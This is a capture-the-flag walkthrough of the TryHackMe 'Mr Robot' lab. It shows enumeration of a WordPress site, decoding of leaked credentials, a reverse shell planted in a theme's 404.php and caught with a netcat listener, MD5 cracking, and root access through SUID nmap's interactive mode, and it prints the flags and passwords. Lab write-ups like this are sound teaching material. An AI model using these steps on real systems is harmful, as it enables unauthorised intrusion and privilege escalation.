# 🖥️ Mr Robot — TryHackMe

| Field | Details |
|---|---|
| 🏷️ Machine | Mr Robot |
| 🌐 Platform | TryHackMe |
| 🎯 Difficulty | Medium |
| 🧠 Topics | WordPress Exploitation, Credential Discovery, Reverse Shell, SUID PrivEsc |
| 👤 Author | Sandeep Prasad Chowdhury |

---

## 📌 Summary

The target hosts a WordPress site with exposed sensitive files. Credentials were discovered via Base64 decoding, leading to admin access. A reverse shell was obtained through theme editing. Post-exploitation revealed hashed credentials, which were cracked to pivot into another user. Privilege escalation was achieved using SUID `nmap`.

---

## 🔍 1. Reconnaissance & Enumeration

```bash
nmap -sCV <TARGET_IP>
```

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP (WordPress) |

---

## 🔎 2. Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- /robots.txt
- /license

---

## 📄 3. robots.txt Analysis

```bash
curl http://<TARGET_IP>/robots.txt
```

Discovered:
- fsocity.dic
- key-1-of-3.txt

```bash
curl http://<TARGET_IP>/key-1-of-3.txt
```

Flag1: 073403c8a58a1f80d943455fb30724b9

---

## 🔐 4. Credential Discovery

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

Credentials: elliot : ER28-0652

---

## 💥 5. Initial Access

- Login WordPress
- Inject reverse shell in 404.php

```bash
nc -lnvp 4444
```

Trigger shell via browser.

---

## 🧪 6. Post Exploitation

```bash
cd /home/robot
ls
```

Found:
- key-2-of-3.txt
- password.raw-md5

---

## 🔓 7. Password Cracking

```bash
cat password.raw-md5
```

c3fcd3d76192e4007dfb496cca67e13b

Password: abcdefghijklmnopqrstuvwxyz

```bash
su robot
cat key-2-of-3.txt
```

Flag2: 822c73956184f694993bede3eb39f959

---

## ⬆️ 8. Privilege Escalation

```bash
find / -perm -4000 2>/dev/null
```

```bash
nmap --interactive
!sh
```

---

## 🚩 9. Root Flag

```bash
cat /root/key-3-of-3.txt
```

04787ddef27c3dee1ee161b21670b4e4

---
